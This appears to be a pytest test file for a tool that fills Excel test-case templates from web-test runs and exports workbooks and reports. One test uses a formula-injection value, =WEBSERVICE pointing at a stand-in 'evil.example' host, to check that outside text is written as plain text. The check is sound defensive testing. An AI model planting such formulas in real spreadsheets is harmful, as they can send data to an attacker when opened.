import hashlib
import json
import zipfile
from pathlib import Path

import pytest

openpyxl = pytest.importorskip("openpyxl")

from make_webtest_run import FakeConsole, build  # noqa: E402

from testign import templates, webtest, webtest_export, xlsx  # noqa: E402
from testign.webtest import WebtestError  # noqa: E402

REPO = Path(__file__).resolve().parent.parent
SHIPPED_SAMPLE = REPO / "templates" / "testcase-template-sample.xlsx"
S = "s-test0001"
PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 16


def sha(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


@pytest.fixture
def home(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.setenv("USERPROFILE", str(tmp_path))
    return tmp_path


@pytest.fixture
def sample(home):
    return templates.register(SHIPPED_SAMPLE, "sample", home=home, purpose="webtest")


@pytest.fixture
def root(home):
    return home / "out" / "webtest"


def finished_run(root, server, *, close=True):
    """Build the fixture run, confirm a real column plan, run its rows and close it."""
    run_id = build(root, server, confirm=False)
    folder = webtest.find_run(root, run_id)
    run = webtest.load(folder)
    view = webtest_export.columns_view(folder, run, "sample", ask=True)
    columns = [c for c in view["columns"] if c["field"] != "executed_at"]  # the tester removes one column
    server.reviews["j-plan"] = {"lines": view["lines"], "digest": view["digest"], "template": "sample",
                                "answered_by": "fp", "answered_at": "t",
                                "answer": {"columns": columns, "verdict_labels": view["verdict_labels"],
                                           "rows": {}, "confirm": True}}
    webtest.apply_plan(folder, server, "j-plan", S, check_columns=webtest_export.confirmed_plan)
    server.add_job("j-run", "webtest-run", run=run_id)
    server.sign_ins["j-run"] = {"scenario": "member", "choice": "signed-in", "at": "t"}
    webtest.signed_in(folder, server, "j-run", S, "member")
    verdicts = iter(["pass", "fail", "pass", "fail"])
    while True:
        got = webtest.next_row(folder, server, "j-run", S)
        if not got.get("row"):
            break
        webtest.add_evidence(folder, got["row"], PNG, "agent")
        webtest.record_row(folder, got["row"], {"verdict": next(verdicts), "actual": "seen",
                                                "url": "https://dev.example.test/x"})
    if close:
        server.end_job("j-run")
        webtest.close(folder, server.job_open)
    return folder


def test_entry_without_purpose_loads_as_testcase(home):
    templates.register(SHIPPED_SAMPLE, "old", home=home)
    index = json.loads(templates.index_path(home).read_text(encoding="utf-8"))
    del index["templates"]["old"]["purpose"]
    templates.index_path(home).write_text(json.dumps(index), encoding="utf-8")
    assert templates.list_templates(home)["templates"][0]["purpose"] == "testcase"
    assert templates.resolve("old", home)["purpose"] == "testcase"


def test_webtest_template_without_trace_column_registers(home, tmp_path):
    wb = openpyxl.Workbook()
    ws = wb.active
    for c, h in enumerate(["No", "確認内容", "結果"], start=1):
        ws.cell(row=2, column=c, value=h)
    path = tmp_path / "web.xlsx"
    wb.save(path)
    with pytest.raises(templates.TemplateMappingFailed):
        templates.register(path, "web", home=home)
    entry = templates.register(path, "web", home=home, purpose="webtest")
    assert entry["purpose"] == "webtest" and entry["header_row"] == 2 and "trace" not in entry["columns"]


def test_first_guess_on_the_shipped_sample(sample):
    entry = templates.resolve("sample")
    plan = webtest_export.first_guess(entry, webtest_export.sheet_facts(entry), "ja")
    fields = {c["field"]: c for c in plan["columns"]}
    assert "mobile_method" not in fields  # proposed only for a run with phone-width rows
    assert fields["content"]["letter"] == "B" and fields["verdict"]["letter"] == "F"
    assert fields["executed_at"]["letter"] == "G" and fields["evidence"]["letter"] == "E"
    assert fields["actual"].get("new") and fields["actual"]["letter"] == "I"
    assert fields["screen"].get("new") and fields["screen"]["header"] == "画面"
    assert plan["verdict_labels"] == {"pass": "OK", "fail": "NG", "not-run": "保留", "not-applicable": "対象外"}


def test_columns_view_has_three_samples(root, sample):
    server = FakeConsole()
    run_id = build(root, server, confirm=False)
    folder = webtest.find_run(root, run_id)
    view = webtest_export.columns_view(folder, webtest.load(folder), "sample")
    assert [s["class"] for s in view["samples"]] == ["sure", "choice", "not-web"]
    phone = next(c for c in view["plan"]["columns"] if c["field"] == "mobile_method")  # r08 is a phone row
    assert phone.get("new") and phone["header"] == "Phone check"
    ask = webtest_export.columns_view(folder, webtest.load(folder), "sample", ask=True)
    assert ask["type"] == "review-table" and len(ask["lines"]) == 8 and ask["digest"]


def test_review_ask_id_changes_with_the_table(root, sample):
    """An answered ask id hands back its old answer, so a changed table must be asked under a new id."""
    from testign.console import jobs  # noqa: PLC0415

    server = FakeConsole()
    run_id = build(root, server, confirm=False)
    folder = webtest.find_run(root, run_id)
    first = webtest_export.columns_view(folder, webtest.load(folder), "sample", ask=True)
    again = webtest_export.columns_view(folder, webtest.load(folder), "sample", ask=True)
    assert first["id"] == again["id"] and jobs.validate_ask(first)["id"] == first["id"]
    webtest.triage(folder, {"r01": {"class": "choice", "runner": "tester"}})
    changed = webtest_export.columns_view(folder, webtest.load(folder), "sample", ask=True)
    assert changed["id"] != first["id"]


@pytest.mark.parametrize("columns,message", [
    ([{"field": "content", "letter": "B"}], "verdict"),
    ([{"field": "content", "letter": "B"}, {"field": "verdict", "letter": "B"}], "twice"),
    ([{"field": "content", "letter": "B"}, {"field": "verdict", "letter": "F"},
      {"field": "screen", "letter": "C", "header": "画面", "new": True}], "right of"),
    ([{"field": "content", "letter": "B"}, {"field": "verdict", "letter": "F"}, {"field": "password", "letter": "I"}],
     "unknown"),
    ([{"field": "content", "letter": "B"}, {"field": "verdict", "letter": "Z"}], "no header"),
])
def test_column_plan_checks(sample, columns, message):
    entry = templates.resolve("sample")
    with pytest.raises(WebtestError, match=message):
        webtest_export.check_columns(columns, webtest_export.sheet_facts(entry))


def test_new_column_in_a_merged_header_is_refused(home, tmp_path):
    wb = openpyxl.Workbook()
    ws = wb.active
    for c, h in enumerate(["No", "確認内容", "結果"], start=1):
        ws.cell(row=2, column=c, value=h)
    ws.merge_cells("D2:F2")
    path = tmp_path / "merged.xlsx"
    wb.save(path)
    templates.register(path, "merged", home=home, purpose="webtest")
    facts = webtest_export.sheet_facts(templates.resolve("merged"))
    with pytest.raises(WebtestError, match="D2:F2"):
        webtest_export.check_columns([{"field": "content", "letter": "B"}, {"field": "verdict", "letter": "C"},
                                      {"field": "screen", "letter": "E", "header": "Screen", "new": True}], facts)


def test_export_writes_a_new_workbook_and_report(root, sample):
    server = FakeConsole()
    stored = templates.resolve("sample")["path"]
    before = sha(Path(stored))
    folder = finished_run(root, server)
    out = webtest_export.export(folder, webtest.load(folder))
    assert sha(Path(stored)) == before  # the registered template is never changed
    wb = openpyxl.load_workbook(out["workbook"])
    ws = wb["テストケース"]
    assert ws["I4"].value == "Actual" and ws["J4"].value == "Screen"  # new header cells, in report_lang
    rows = {ws.cell(row=r, column=1).value: r for r in range(5, ws.max_row + 1) if ws.cell(row=r, column=2).value}
    assert len(rows) == 8
    verdicts = [ws.cell(row=r, column=6).value for r in rows.values()]
    assert set(verdicts) <= {"OK", "NG", "保留", "対象外"}  # every value passes the column's list
    assert all(ws.cell(row=r, column=7).value is None for r in rows.values())  # removed column stays empty
    r02 = rows["2"]
    assert ws.cell(row=r02, column=5).value.startswith("evidence/r02-a1-1.png")
    report = Path(out["report"]).read_text(encoding="utf-8")
    run = webtest.load(folder)
    for case in run["cases"]:
        if case["state"] in ("fail", "not-run"):
            assert f"| {case['row']} |" in report
    assert "r03" in report.split("## Visual rows")[1]
    second = webtest_export.export(folder, webtest.load(folder))
    assert second["workbook"] != out["workbook"] and Path(out["workbook"]).exists()
    assert second["report"] != out["report"]


def test_the_report_says_how_each_phone_row_was_checked(root, sample):
    folder = finished_run(root, FakeConsole())
    report = Path(webtest_export.export(folder, webtest.load(folder))["report"]).read_text(encoding="utf-8")
    every_row = report.split("## All rows")[1].splitlines()
    assert "Phone check" in every_row[2]
    r08 = next(line for line in every_row if line.startswith("| r08 |"))
    assert r08.endswith("| Real device |")  # r08 is the fixture's phone-width row
    assert next(line for line in every_row if line.startswith("| r02 |")).endswith("|  |")


@pytest.mark.parametrize("case,lang,text", [
    ({"viewport": "pc", "state": "pass"}, "en", ""),
    ({"viewport": "mobile", "state": "self-run"}, "en", ""),  # a run written before the method existed
    ({"viewport": "mobile", "mobile_method": "device", "state": "self-run"}, "vi", "Điện thoại thật"),
    ({"viewport": "mobile", "mobile_method": "emulation", "state": "pass", "result": {"by": "agent"}}, "ja",
     "エミュレーション（エージェント、390 px フレーム）"),
    ({"viewport": "mobile", "mobile_method": "emulation", "state": "self-run", "result": {"by": "tester:A"}}, "en",
     "Tester (real phone or device mode)"),
    ({"viewport": "mobile", "mobile_method": "emulation", "state": "not-run", "not_run_reason": "skipped"}, "en",
     "Emulation (planned)"),
    ({"viewport": "mobile", "mobile_method": "emulation", "state": "parked"}, "en", "Emulation (planned)"),
])
def test_phone_check_text(case, lang, text):
    assert webtest_export.mobile_text(case, lang) == text


def test_export_refuses_an_open_row(root, sample):
    server = FakeConsole()
    folder = finished_run(root, server, close=False)
    with pytest.raises(WebtestError, match="still open"):
        webtest_export.export(folder, webtest.load(folder))


def test_outside_text_starting_with_equals_is_written_as_text(sample, tmp_path):
    entry = templates.resolve("sample")
    out = xlsx.fill_columns(Path(entry["path"]), entry["sheet"], entry["header_row"], {"content": "B", "verdict": "F"},
                            [{"content": '=WEBSERVICE("https://evil.example/")', "verdict": "OK"}],
                            tmp_path / "out.xlsx")
    ws = openpyxl.load_workbook(out["path"])[entry["sheet"]]
    cell = ws.cell(row=out["rows"][0], column=2)
    assert cell.value == '=WEBSERVICE("https://evil.example/")' and cell.data_type == "s"


def test_xlsm_templates_keep_their_macros(home, tmp_path):
    src = xlsx.build_sample(tmp_path / "macro.xlsx")
    xlsm = tmp_path / "macro.xlsm"
    with zipfile.ZipFile(src) as zin, zipfile.ZipFile(xlsm, "w") as zout:
        for item in zin.infolist():
            data = zin.read(item.filename)
            if item.filename == "[Content_Types].xml":
                data = data.replace(b"</Types>", b'<Default Extension="bin" ContentType="application/'
                                    b'vnd.ms-office.vbaProject"/></Types>')
            zout.writestr(item, data)
        zout.writestr("xl/vbaProject.bin", b"fake macro project")
    entry = templates.register(xlsm, "macro", home=home, purpose="webtest")
    out = xlsx.fill_columns(Path(entry["path"]), entry["sheet"], entry["header_row"], {"content": "B"},
                            [{"content": "x"}], tmp_path / "out.xlsx")
    assert out["path"].endswith(".xlsm")
    with zipfile.ZipFile(out["path"]) as z:
        assert z.read("xl/vbaProject.bin") == b"fake macro project"
